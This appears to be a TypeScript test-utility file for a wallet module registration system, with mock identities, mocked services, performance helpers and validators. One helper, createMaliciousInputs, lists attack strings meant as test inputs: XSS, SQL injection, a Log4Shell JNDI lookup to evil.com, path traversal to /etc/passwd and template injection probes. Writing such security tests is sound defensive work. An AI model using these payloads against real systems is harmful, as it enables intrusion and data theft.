/**
 * Qwallet Module Registration Test Utilities
 * Common utilities and helpers for module registration tests
 */

import { vi } from 'vitest';
import {
  ModuleInfo,
  QModuleMetadata,
  SignedModuleMetadata,
  ModuleCompliance,
  ModuleStatus,
  DEFAULT_MODULE_COMPLIANCE
} from '../../types/qwallet-module-registration';
import { IdentityType } from '../../types/identity';
import { ExtendedSquidIdentity } from '../../types/identity';

// Mock Identity Creation
export function createMockIdentity(type: IdentityType, overrides?: Partial<ExtendedSquidIdentity>): ExtendedSquidIdentity {
  const baseIdentity: ExtendedSquidIdentity = {
    did: `did:${type.toLowerCase()}:${Math.random().toString(36).substring(7)}`,
    type,
    displayName: `Mock ${type} Identity`,
    publicKey: `mock-public-key-${Math.random().toString(36).substring(7)}`,
    privateKey: `mock-private-key-${Math.random().toString(36).substring(7)}`,
    isActive: true,
    createdAt: new Date().toISOString(),
    lastUsed: new Date().toISOString(),
    permissions: getDefaultPermissions(type),
    metadata: {
      version: '1.0.0',
      capabilities: getDefaultCapabilities(type)
    }
  };

  return { ...baseIdentity, ...overrides };
}

function getDefaultPermissions(type: IdentityType): string[] {
  switch (type) {
    case IdentityType.ROOT:
      return ['register', 'update', 'deregister', 'verify', 'admin'];
    case IdentityType.DAO:
      return ['register', 'update', 'deregister', 'verify'];
    case IdentityType.ENTERPRISE:
      return ['register', 'update', 'verify'];
    case IdentityType.CONSENTIDA:
      return ['verify'];
    case IdentityType.AID:
      return [];
    default:
      return [];
  }
}

function getDefaultCapabilities(type: IdentityType): string[] {
  switch (type) {
    case IdentityType.ROOT:
      return ['full-access', 'admin-operations', 'system-management'];
    case IdentityType.DAO:
      return ['governance', 'collective-decisions', 'voting'];
    case IdentityType.ENTERPRISE:
      return ['business-operations', 'compliance', 'reporting'];
    case IdentityType.CONSENTIDA:
      return ['guardian-approval', 'limited-access'];
    case IdentityType.AID:
      return ['anonymous-access', 'privacy-focused'];
    default:
      return [];
  }
}

// Mock Module Info Creation
export function createMockModuleInfo(name: string, version: string, overrides?: Partial<ModuleInfo>): ModuleInfo {
  const baseModuleInfo: ModuleInfo = {
    name,
    version,
    description: `Mock module ${name} for testing purposes`,
    identitiesSupported: [IdentityType.ROOT, IdentityType.DAO, IdentityType.ENTERPRISE],
    integrations: ['Qindex', 'Qlock', 'Qerberos'],
    repositoryUrl: `https://github.com/anarq/${name.toLowerCase()}`,
    documentationCid: generateMockCID(),
    auditHash: generateMockHash(),
    compliance: { ...DEFAULT_MODULE_COMPLIANCE }
  };

  return { ...baseModuleInfo, ...overrides };
}

// Mock QModuleMetadata Creation
export function createMockQModuleMetadata(name: string, version: string, overrides?: Partial<QModuleMetadata>): QModuleMetadata {
  const baseMetadata: QModuleMetadata = {
    module: name,
    version,
    description: `Mock module ${name} for testing purposes`,
    identities_supported: [IdentityType.ROOT, IdentityType.DAO, IdentityType.ENTERPRISE],
    integrations: ['Qindex', 'Qlock', 'Qerberos'],
    dependencies: [],
    status: ModuleStatus.PRODUCTION_READY,
    audit_hash: generateMockHash(),
    compliance: { ...DEFAULT_MODULE_COMPLIANCE },
    repository: `https://github.com/anarq/${name.toLowerCase()}`,
    documentation: generateMockCID(),
    activated_by: 'did:root:mock-activator',
    timestamp: Date.now(),
    checksum: generateMockHash(),
    signature_algorithm: 'RSA-SHA256',
    public_key_id: 'mock-key-id'
  };

  return { ...baseMetadata, ...overrides };
}

// Mock Signed Metadata Creation
export function createMockSignedMetadata(moduleInfo: ModuleInfo, signerIdentity: ExtendedSquidIdentity): SignedModuleMetadata {
  const metadata = createMockQModuleMetadata(moduleInfo.name, moduleInfo.version, {
    description: moduleInfo.description,
    identities_supported: moduleInfo.identitiesSupported,
    integrations: moduleInfo.integrations,
    repository: moduleInfo.repositoryUrl,
    documentation: moduleInfo.documentationCid,
    audit_hash: moduleInfo.auditHash,
    compliance: moduleInfo.compliance,
    activated_by: signerIdentity.did,
    public_key_id: signerIdentity.publicKey
  });

  return {
    metadata,
    signature: `mock-signature-${Math.random().toString(36).substring(7)}`,
    publicKey: signerIdentity.publicKey,
    signature_type: 'RSA-SHA256',
    signed_at: Date.now(),
    signer_identity: signerIdentity.did
  };
}

// Mock Generation Options
export function createMockGenerationOptions(activatedBy: string, publicKeyId: string, overrides?: any) {
  return {
    activatedBy,
    publicKeyId,
    signatureAlgorithm: 'RSA-SHA256' as const,
    customTimestamp: Date.now(),
    skipChecksumGeneration: false,
    ...overrides
  };
}

// Utility Functions
export function generateMockHash(): string {
  return Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
}

export function generateMockCID(): string {
  const base58chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
  let cid = 'Qm';
  for (let i = 0; i < 44; i++) {
    cid += base58chars[Math.floor(Math.random() * base58chars.length)];
  }
  return cid;
}

// Mock Ecosystem Services
export function createMockQindexService() {
  return {
    registerModule: vi.fn().mockResolvedValue({
      success: true,
      cid: generateMockCID(),
      indexId: `index-${Math.random().toString(36).substring(7)}`,
      timestamp: new Date().toISOString()
    }),
    getModule: vi.fn().mockImplementation((moduleId: string) => {
      if (moduleId === 'NonExistentModule') {
        return Promise.resolve(null);
      }
      return Promise.resolve({
        moduleId,
        metadata: createMockQModuleMetadata(moduleId, '1.0.0'),
        signedMetadata: createMockSignedMetadata(
          createMockModuleInfo(moduleId, '1.0.0'),
          createMockIdentity(IdentityType.ROOT)
        ),
        registrationInfo: {
          cid: generateMockCID(),
          indexId: `index-${moduleId}`,
          registeredAt: new Date().toISOString(),
          registeredBy: 'did:root:mock',
          status: ModuleStatus.PRODUCTION_READY,
          verificationStatus: 'VERIFIED' as const,
          testMode: false
        },
        accessStats: {
          queryCount: 0,
          lastAccessed: new Date().toISOString(),
          dependentModules: []
        }
      });
    }),
    searchModules: vi.fn().mockResolvedValue({
      modules: [],
      totalCount: 0,
      hasMore: false
    }),
    updateModuleMetadata: vi.fn().mockResolvedValue(true),
    deregisterModule: vi.fn().mockResolvedValue(true),
    verifyModule: vi.fn().mockResolvedValue({
      moduleId: 'test',
      status: 'production_ready',
      verificationChecks: {
        metadataValid: true,
        signatureValid: true,
        dependenciesResolved: true,
        complianceVerified: true,
        auditPassed: true
      },
      issues: [],
      lastVerified: new Date().toISOString(),
      verifiedBy: 'system'
    }),
    registerSandboxModule: vi.fn().mockResolvedValue({
      success: true,
      cid: generateMockCID(),
      indexId: `sandbox-index-${Math.random().toString(36).substring(7)}`,
      timestamp: new Date().toISOString()
    }),
    listSandboxModules: vi.fn().mockResolvedValue([]),
    promoteSandboxModule: vi.fn().mockResolvedValue(true),
    checkDependencyCompatibility: vi.fn().mockResolvedValue({
      compatible: true,
      conflicts: [],
      missingDependencies: []
    })
  };
}

export function createMockQerberosService() {
  return {
    logEvent: vi.fn().mockResolvedValue({
      success: true,
      eventId: `event-${Math.random().toString(36).substring(7)}`,
      timestamp: new Date().toISOString()
    }),
    getAuditLog: vi.fn().mockResolvedValue({
      events: [],
      totalCount: 0
    }),
    verifyAuditIntegrity: vi.fn().mockResolvedValue(true)
  };
}

// Test Environment Setup
export async function setupMockEcosystemServices() {
  const mockQindex = createMockQindexService();
  const mockQerberos = createMockQerberosService();

  // Mock the dynamic imports
  vi.doMock('../../backend/ecosystem/QindexService.mjs', () => ({
    getQindexService: () => mockQindex
  }));

  vi.doMock('../../backend/ecosystem/QerberosService.mjs', () => ({
    getQerberosService: () => mockQerberos
  }));

  return {
    qindexService: mockQindex,
    qerberosService: mockQerberos
  };
}

// Security Test Utilities
export function createMaliciousInputs(): string[] {
  return [
    '<script>alert("xss")</script>',
    '"; DROP TABLE modules; --',
    '${jndi:ldap://evil.com/a}',
    '../../../etc/passwd',
    'javascript:alert("xss")',
    '<img src=x onerror=alert("xss")>',
    '{{7*7}}',
    '${7*7}',
    '#{7*7}',
    '\x00\x01\x02\x03',
    'A'.repeat(10000), // Buffer overflow attempt
    '\n\r\t\b\f',
    '\\x41\\x42\\x43',
    '%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E'
  ];
}

export async function setupSecurityTestEnvironment() {
  const auditEvents: any[] = [];
  
  return {
    getAuditEvents: () => auditEvents,
    addAuditEvent: (event: any) => auditEvents.push(event),
    verifyAuditIntegrity: () => {
      // Simulate audit integrity check
      return auditEvents.every(event => event.signature && event.timestamp);
    },
    cleanup: () => {
      auditEvents.length = 0;
    }
  };
}

// Performance Test Utilities
export async function measurePerformance<T>(operation: () => Promise<T>): Promise<{
  result: T;
  duration: number;
  memoryUsage: NodeJS.MemoryUsage;
}> {
  const startTime = Date.now();
  const startMemory = process.memoryUsage();
  
  const result = await operation();
  
  const endTime = Date.now();
  const endMemory = process.memoryUsage();
  
  return {
    result,
    duration: endTime - startTime,
    memoryUsage: {
      rss: endMemory.rss - startMemory.rss,
      heapTotal: endMemory.heapTotal - startMemory.heapTotal,
      heapUsed: endMemory.heapUsed - startMemory.heapUsed,
      external: endMemory.external - startMemory.external,
      arrayBuffers: endMemory.arrayBuffers - startMemory.arrayBuffers
    }
  };
}

export function generateLargeDataset(count: number, namePrefix: string): ModuleInfo[] {
  const modules: ModuleInfo[] = [];
  
  for (let i = 0; i < count; i++) {
    modules.push(createMockModuleInfo(`${namePrefix}${i}`, '1.0.0', {
      description: `Generated module ${i} for performance testing`,
      integrations: ['Qindex', 'Qlock', 'Qerberos'].slice(0, (i % 3) + 1)
    }));
  }
  
  return modules;
}

export async function setupPerformanceTestEnvironment() {
  const metrics: { [operation: string]: number[] } = {};
  
  return {
    recordMetric: (operation: string, duration: number) => {
      if (!metrics[operation]) {
        metrics[operation] = [];
      }
      metrics[operation].push(duration);
    },
    getMetrics: (operation: string) => metrics[operation] || [],
    getAverageMetric: (operation: string) => {
      const values = metrics[operation] || [];
      return values.length > 0 ? values.reduce((sum, val) => sum + val, 0) / values.length : 0;
    },
    cleanup: async () => {
      Object.keys(metrics).forEach(key => delete metrics[key]);
    }
  };
}

export function createPerformanceMetrics() {
  const operations: { [name: string]: { durations: number[]; timestamps: number[] } } = {};
  
  return {
    recordOperation: (name: string, duration: number) => {
      if (!operations[name]) {
        operations[name] = { durations: [], timestamps: [] };
      }
      operations[name].durations.push(duration);
      operations[name].timestamps.push(Date.now());
    },
    
    getStats: (name: string) => {
      const op = operations[name];
      if (!op || op.durations.length === 0) {
        return { average: 0, min: 0, max: 0, count: 0, trend: 0 };
      }
      
      const durations = op.durations;
      const average = durations.reduce((sum, d) => sum + d, 0) / durations.length;
      const min = Math.min(...durations);
      const max = Math.max(...durations);
      
      // Calculate trend (simple linear regression slope)
      let trend = 0;
      if (durations.length > 1) {
        const n = durations.length;
        const sumX = (n * (n - 1)) / 2; // Sum of indices
        const sumY = durations.reduce((sum, d) => sum + d, 0);
        const sumXY = durations.reduce((sum, d, i) => sum + (i * d), 0);
        const sumX2 = (n * (n - 1) * (2 * n - 1)) / 6; // Sum of squared indices
        
        trend = (n * sumXY - sumX * sumY) / (n * sumX2 - sumX * sumX);
      }
      
      return { average, min, max, count: durations.length, trend };
    }
  };
}

// E2E Test Utilities
export function createTestScenario(name: string, config: any) {
  return {
    name,
    moduleInfo: config.moduleInfo,
    signerIdentity: config.signerIdentity,
    expectedOutcome: config.expectedOutcome,
    steps: config.steps || []
  };
}

export async function validateCompleteWorkflow(scenario: any, services: any) {
  const { registrationService, verificationService, testEnvironment } = services;
  
  // Step 1: Registration
  const request = { moduleInfo: scenario.moduleInfo };
  const registrationResult = await registrationService.registerModule(request, scenario.signerIdentity);
  
  // Step 2: Retrieval
  const retrievedModule = await registrationService.getModule(scenario.moduleInfo.name);
  
  // Step 3: Verification
  const verificationResult = await registrationService.verifyModule(scenario.moduleInfo.name);
  
  // Step 4: Search
  const searchResult = await registrationService.searchModules({ name: scenario.moduleInfo.name });
  
  // Step 5: Audit Trail
  const auditEvents = testEnvironment.getAuditEvents ? testEnvironment.getAuditEvents() : [];
  
  return {
    registration: registrationResult,
    retrieval: { module: retrievedModule },
    verification: verificationResult,
    searchability: {
      found: searchResult.modules.length > 0,
      searchResults: searchResult
    },
    auditTrail: {
      events: auditEvents
    }
  };
}

export async function setupCompleteTestEnvironment() {
  const mockServices = await setupMockEcosystemServices();
  const securityEnv = await setupSecurityTestEnvironment();
  const performanceEnv = await setupPerformanceTestEnvironment();
  
  return {
    ...mockServices,
    ...securityEnv,
    ...performanceEnv,
    simulateTransientFailures: (shouldFail: () => boolean) => {
      mockServices.qindexService.registerModule.mockImplementation(() => {
        if (shouldFail()) {
          throw new Error('Transient failure');
        }
        return Promise.resolve({
          success: true,
          cid: generateMockCID(),
          indexId: `index-${Math.random().toString(36).substring(7)}`,
          timestamp: new Date().toISOString()
        });
      });
    },
    simulatePermanentFailure: (errorMessage: string) => {
      mockServices.qindexService.registerModule.mockRejectedValue(new Error(errorMessage));
    },
    cleanup: async () => {
      await securityEnv.cleanup();
      await performanceEnv.cleanup();
      vi.clearAllMocks();
    }
  };
}

// Validation Utilities
export function validateModuleMetadata(metadata: QModuleMetadata): boolean {
  const requiredFields = [
    'module', 'version', 'description', 'identities_supported', 'integrations',
    'status', 'audit_hash', 'compliance', 'repository', 'documentation',
    'activated_by', 'timestamp', 'checksum', 'signature_algorithm', 'public_key_id'
  ];
  
  return requiredFields.every(field => metadata[field as keyof QModuleMetadata] !== undefined);
}

export function validateSignedMetadata(signedMetadata: SignedModuleMetadata): boolean {
  const requiredFields = ['metadata', 'signature', 'publicKey', 'signature_type', 'signed_at', 'signer_identity'];
  
  return requiredFields.every(field => signedMetadata[field as keyof SignedModuleMetadata] !== undefined) &&
         validateModuleMetadata(signedMetadata.metadata);
}

// Mock Data Generators
export function createMockCompliance(overrides?: Partial<ModuleCompliance>): ModuleCompliance {
  return {
    ...DEFAULT_MODULE_COMPLIANCE,
    ...overrides
  };
}

export function createMockModuleWithDependencies(name: string, dependencies: string[]): ModuleInfo {
  return createMockModuleInfo(name, '1.0.0', {
    integrations: dependencies
  });
}

// Test Assertion Helpers
export function expectValidModuleRegistration(result: any) {
  expect(result.success).toBe(true);
  expect(result.moduleId).toBeDefined();
  expect(result.cid).toBeDefined();
  expect(result.indexId).toBeDefined();
  expect(result.timestamp).toBeDefined();
}

export function expectValidModuleVerification(result: any) {
  expect(result.moduleId).toBeDefined();
  expect(result.status).toBeDefined();
  expect(result.verificationChecks).toBeDefined();
  expect(result.lastVerified).toBeDefined();
  expect(result.verifiedBy).toBeDefined();
}

export function expectValidAuditEvent(event: any) {
  expect(event.action).toBeDefined();
  expect(event.moduleId).toBeDefined();
  expect(event.timestamp).toBeDefined();
  expect(event.success).toBeDefined();
}

// Error Testing Utilities
export function createInvalidModuleInfo(type: 'empty-name' | 'invalid-version' | 'missing-fields'): ModuleInfo {
  const base = createMockModuleInfo('ValidModule', '1.0.0');
  
  switch (type) {
    case 'empty-name':
      return { ...base, name: '' };
    case 'invalid-version':
      return { ...base, version: 'not-semver' };
    case 'missing-fields':
      return { ...base, identitiesSupported: [] as any };
    default:
      return base;
  }
}

export function createCorruptedSignedMetadata(signedMetadata: SignedModuleMetadata, corruption: 'signature' | 'metadata' | 'timestamp'): SignedModuleMetadata {
  switch (corruption) {
    case 'signature':
      return { ...signedMetadata, signature: 'corrupted-signature' };
    case 'metadata':
      return { ...signedMetadata, metadata: { ...signedMetadata.metadata, version: 'corrupted' } };
    case 'timestamp':
      return { ...signedMetadata, signed_at: -1 };
    default:
      return signedMetadata;
  }
}